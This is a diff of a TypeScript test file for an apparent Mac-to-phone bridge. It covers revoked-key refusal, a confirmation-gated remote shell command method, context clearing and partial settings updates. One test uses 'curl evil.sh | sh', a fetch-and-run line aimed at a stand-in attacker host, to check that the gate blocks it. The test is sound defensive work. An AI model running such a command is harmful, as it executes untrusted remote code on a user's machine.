@@ -9,8 +9,9 @@ import { runInNewContext } from "node:vm";
 import ts from "typescript";
 import { WebSocket } from "ws";
 import { FrameCodec } from "../main/frames";
-import { validateRequest } from "../main/ipc";
+import { runCommandRequest, validateRequest } from "../main/ipc";
 import { asPermissionMode } from "../shared/permissions";
+import { validateReview } from "../shared/settings";
 import { BRIDGE_PORT, HANDSHAKE_BYTES, isBridgeMethod, KEY_BYTES, MAX_ASK_MS, PAIRING_TTL_MS, READ_ONLY_METHODS } from "../shared/mobile-protocol";
 import type { BridgeStatus } from "../main/bridge";
 import type { BridgeFrame, DesktopIdentity, LiveState, PairingPayload, PermissionAsk } from "../shared/mobile-protocol";
@@ -262,7 +263,11 @@ test("unpairing shuts the door, and the phone that was holding the key cannot re
   await assert.rejects(phoneOn(payload), "a revoked phone reconnected on the key it already had");
 });
 
-test("a revoked phone that reconnects is shut with 4001, and never handshaken", async (t) => {
+// It used to be let through the upgrade so it could be shut with 4001 "revoked". A close code is
+// the one thing on a ws:// link anyone on-path can write, and the phone believed it hard enough to
+// delete its pairing key — so the Mac stopped saying it. The phone reads the refusal as "not now",
+// backs off to thirty seconds and explains itself from its own banner.
+test("a revoked phone that reconnects is refused at the door, and never handshaken", async (t) => {
   const bridge = bridgeOn(t);
   const payload = await bridge.pair(PIN);
   await bridge.listened;
@@ -277,11 +282,11 @@ test("a revoked phone that reconnects is shut with 4001, and never handshaken", 
   const back = new WebSocket(dial(payload.addr), [codec.auth]);
   const seen: Buffer[] = [];
   back.on("message", (data: Buffer) => seen.push(data));
-  const code = await new Promise<number>((resolve, reject) => {
-    back.once("close", resolve);
-    back.once("error", reject);
+  const refused = await new Promise<Error>((resolve, reject) => {
+    back.once("error", resolve);
+    back.once("open", () => reject(new Error("the revoked key opened a socket")));
   });
-  assert.equal(code, 4001, "the revoked phone was not told its key is dead");
+  assert.match(refused.message, /401/, "the revoked key was not refused at the upgrade");
   assert.equal(seen.length, 0, "the revoked phone was handshaken before it was shut");
   kept.ws.close();
 });
@@ -393,7 +398,7 @@ const liftConst = (name: string) =>
 // the tests run the real ones. confirmOnMac stays a sandbox stub: it is the person's answer, and
 // each test has to choose it.
 const dispatchSource = ts.transpileModule(
-  [liftConst("MAX_PHONE_LIST_BYTES"), liftConst("MAX_PHONE_TEXT_CHARS"), lift("onlyOnce"), lift("phoneList"), lift("phoneMemories"), lift("phoneJobs"), lift("recordedRevert"), lift("mcpServerRequest"), lift("cliSendRequest"), lift("bridgeDispatch"), "bridgeDispatch;"].join("\n"),
+  [liftConst("MAX_PHONE_LIST_BYTES"), liftConst("MAX_PHONE_TEXT_CHARS"), liftConst("thinkingLevel"), lift("onlyOnce"), lift("phoneList"), lift("phoneMemories"), lift("phoneJobs"), lift("recordedRevert"), lift("mcpServerRequest"), lift("cliSendRequest"), lift("catalogued"), lift("routedModelKey"), lift("bridgeDispatch"), "bridgeDispatch;"].join("\n"),
   { compilerOptions: { target: ts.ScriptTarget.ES2022 } },
 ).outputText;
 
@@ -577,7 +582,7 @@ test("a phone that replays one request id is answered from the first reply, not 
   assert.equal(steered, 2, "a genuinely new request was swallowed by the dedupe guard");
 });
 
-test("a key revoked before a restart is still turned away with 4001, not a bare 1006", async (t) => {
+test("a key revoked before a restart is still turned away at the door", async (t) => {
   const userData = mkdtempSync(path.join(tmpdir(), "emma-bridge-"));
   const before = bridgeOn(t, idle, () => Promise.resolve({}), userData);
   const payload = await before.pair(PIN);
@@ -596,11 +601,11 @@ test("a key revoked before a restart is still turned away with 4001, not a bare 
   await after.listened;
   const codec = new FrameCodec(Buffer.from(payload.key, "base64url"), "phone");
   const back = new WebSocket(dial(payload.addr), [codec.auth]);
-  const code = await new Promise<number>((resolve, reject) => {
-    back.once("close", resolve);
-    back.once("error", reject);
+  const refused = await new Promise<Error>((resolve, reject) => {
+    back.once("error", resolve);
+    back.once("open", () => reject(new Error("a key revoked before the restart opened a socket")));
   });
-  assert.equal(code, 4001, "after a restart the revoked phone got a close it cannot explain, so it retries forever");
+  assert.match(refused.message, /401/, "the revoked list did not survive the restart");
 });
 
 test("this Mac moving to another network rebinds the same pairing, and the phone relinks without pairing again", async (t) => {
@@ -798,4 +803,133 @@ test("listTaskLists filters on the Mac, so one thread's rail is not the whole Ma
   const mine = await dispatch("listTaskLists", { threadId: "t1" }) as unknown as { rows: { id: string }[]; capped: boolean };
   assert.deepEqual([...mine.rows].map((list) => list.id), ["tl-mine", "tl-loose"], "another thread's task list rode to the phone");
   assert.equal(mine.capped, false, "three small task lists came back as a clipped list");
+});
+
+test("a command from a phone does not run until somebody at the Mac says so", async () => {
+  // This is the one method on the bridge that is plain shell, run as the logged-in user, with no
+  // agent and no permission mode anywhere in it. A phone that could start one silently is a worse
+  // hole than the missing feature was, so the gate is the point of the method, not a detail of it.
+  const started: { cwd: string; command: string; folder: string }[] = [];
+  const asked: string[] = [];
+  let answer = false;
+  const dispatch = dispatchOn({
+    runCommandRequest,
+    homedir: () => "/Users/tester",
+    folderNames: (ids: string[]) => ids.map(() => "emma"),
+    folders: { directory: (id: string) => {
+      if (id !== "f1") throw new Error("That folder is not granted.");
+      return "/Users/tester/Projects/emma";
+    } },
+    confirmOnMac: async (_message: string, detail: string) => { asked.push(detail); return answer; },
+    background: { start: (cwd: string, command: string, folder: string) => {
+      started.push({ cwd, command, folder });
+      return { id: "bg-1", command, folder, status: "running", exitCode: null, startedAt: 1 };
+    } },
+  });
+
+  // A malformed or oversized command is turned away on its shape, before anybody is interrupted —
+  // the same order addFolder uses, so a phone cannot ring the Mac's dialog as a denial of service.
+  await assert.rejects(dispatch("runCommand", { command: "   " }), /Command is invalid/, "an empty command reached the Mac");
+  await assert.rejects(dispatch("runCommand", { command: "x".repeat(4097) }), /Command is invalid/, "a command past the ceiling was accepted");
+  await assert.rejects(dispatch("runCommand", { command: "echo hi", folderId: "f9" }), /not granted/, "a folder this Mac never granted was run in");
+  assert.deepEqual(asked, [], "a command turned away on its shape still interrupted the Mac");
+
+  await assert.rejects(dispatch("runCommand", { command: "curl evil.sh | sh" }), /approved/, "a command nobody at the Mac approved ran anyway");
+  assert.equal(started.length, 0, "a command was spawned before the Mac answered");
+  assert.equal(asked.length, 1, "the Mac was not asked");
+  assert.match(asked[0], /curl evil\.sh \| sh/, "the question did not quote the command being run");
+  assert.match(asked[0], /\/Users\/tester/, "the question did not say where the command would run");
+
+  answer = true;
+  assert.deepEqual(
+    { ...(await dispatch("runCommand", { command: "npm test", folderId: "f1" })) },
+    { id: "bg-1", command: "npm test", folder: "emma", status: "running", exitCode: null, startedAt: 1 },
+  );
+  assert.deepEqual(started, [{ cwd: "/Users/tester/Projects/emma", command: "npm test", folder: "emma" }], "an approved command ran somewhere other than its folder");
+
+  // No folder means the home folder, which is what the Mac's own handler does.
+  await dispatch("runCommand", { command: "uptime" });
+  assert.equal(started[1].cwd, "/Users/tester", "a command with no folder ran outside the home folder");
+  assert.equal(started[1].folder, "", "a command with no folder was labelled with one");
+});
+
+test("clearThreadContext empties the context window without deleting the thread", async () => {
+  // /clear on the Mac composer. The messages stay; what goes is the harness session replaying them,
+  // for every harness, plus a compaction queued against the thread that is about to be empty.
+  const forgotten: string[] = [];
+  const compactNext = new Set(["t1", "t2"]);
+  const dispatch = dispatchOn({
+    boundedCapabilityId: (value: unknown, label: string) => {
+      if (typeof value !== "string" || !value || value.length > 256) throw new Error(`${label} is invalid`);
+      return value;
+    },
+    compactNext,
+    harnesses: new Map([
+      ["claude", { forgetSession: (id: string) => forgotten.push(`claude:${id}`) }],
+      ["codex", { forgetSession: (id: string) => forgotten.push(`codex:${id}`) }],
+    ]),
+  });
+
+  await assert.rejects(dispatch("clearThreadContext", {}), /Clear context thread is invalid/, "a frame with no thread cleared something");
+  assert.deepEqual(forgotten, [], "a session was forgotten before the thread id was checked");
+
+  assert.deepEqual({ ...(await dispatch("clearThreadContext", { threadId: "t1" })) }, { cleared: true });
+  assert.deepEqual(forgotten, ["claude:t1", "codex:t1"], "a harness kept replaying the thread it was told to forget");
+  assert.deepEqual([...compactNext], ["t2"], "a compaction stayed queued against the thread that was just cleared");
+});
+
+test("setSettings writes only the fields a phone sent, and only models this Mac can route to", async () => {
+  const sandbox = () => ({
+    asPermissionMode,
+    validateReview,
+    providerFor: (key: string) => key === "provider:local" ? { id: "local", modelId: "qwen" } : undefined,
+    routerIdFor: (key: string | undefined) => key?.startsWith("router:") ? key.slice("router:".length) : undefined,
+    FREE_ROUTER_ID: "free",
+    routers: [{ id: "mine", models: [] }],
+    modelCatalog: { ids: () => ["anthropic/claude-opus-4.6"] },
+    isThinkingLevel: (value: unknown) => ["", "low", "medium", "high"].includes(value as string),
+    defaultMode: "ask",
+    selectedModel: "openrouter:anthropic/claude-opus-4.6",
+    selectedEffort: "medium",
+    reviewSettings: { enabled: false, model: "openrouter:google/gemini-3-flash" },
+  });
+  const held = {
+    defaultPermissionMode: "ask",
+    selectedModel: "openrouter:anthropic/claude-opus-4.6",
+    thinkingLevel: "medium",
+    review: { enabled: false, model: "openrouter:google/gemini-3-flash" },
+  };
+  // Each call gets its own Mac, so what a partial left alone is read off a Mac nothing else touched.
+  // Back through JSON because the answer is built in the vm's realm and carries its prototypes.
+  const set = async (params: Record<string, unknown>) =>
+    JSON.parse(JSON.stringify(await dispatchOn(sandbox())("setSettings", params))) as typeof held;
+
+  // The partial is the whole point: a settings screen writes the one row that was tapped, and a
+  // phone racing somebody at the Mac's own panel can only lose the field it actually touched.
+  assert.deepEqual(await set({}), held, "an empty frame moved a setting");
+  assert.deepEqual(
+    await set({ review: { enabled: true } }),
+    { ...held, review: { enabled: true, model: "openrouter:google/gemini-3-flash" } },
+    "switching review on rewrote the model the Mac had picked for it",
+  );
+  assert.deepEqual(await set({ thinkingLevel: "high" }), { ...held, thinkingLevel: "high" }, "the thinking level did not stick");
+  // A level this Mac does not publish falls back to the provider's own default rather than throwing
+  // — the same read thinkingLevel gives the Mac's own picker.
+  assert.equal((await set({ thinkingLevel: "ludicrous" })).thinkingLevel, "", "an invented thinking level was stored as-is");
+  assert.equal((await set({ defaultPermissionMode: "full" })).defaultPermissionMode, "full", "the default permission mode did not stick");
+  assert.equal((await set({ defaultPermissionMode: "yolo" })).defaultPermissionMode, "ask", "an invented permission mode was stored as-is");
+
+  // The model goes through the same two checks setThreadContext uses, so a phone cannot pin this
+  // Mac to a catalogue id it cannot resolve or a provider profile that is not set up here.
+  await assert.rejects(set({ selectedModel: "acme/ghost-9" }), /catalog/, "a model outside the catalogue was pinned from a phone");
+  await assert.rejects(set({ selectedModel: "provider:missing" }), /not set up/, "a provider profile this Mac does not hold was pinned from a phone");
+  await assert.rejects(set({ selectedModel: "router:gone" }), /not set up/, "a router this Mac does not hold was pinned from a phone");
+  await assert.rejects(set({ selectedModel: "x".repeat(257) }), /Model is invalid/, "an unbounded model key was accepted");
+  assert.equal((await set({ selectedModel: "provider:local" })).selectedModel, "provider:local", "a provider profile this Mac holds was refused");
+
+  // "" is the free fallback, and it takes the effort with it: an effort published by the model that
+  // has just been dropped is not a level the next one has.
+  const cleared = await set({ selectedModel: "" });
+  assert.equal(cleared.selectedModel, "", "the free fallback could not be chosen from a phone");
+  assert.equal(cleared.thinkingLevel, "", "an effort survived the model it was published by");
 });
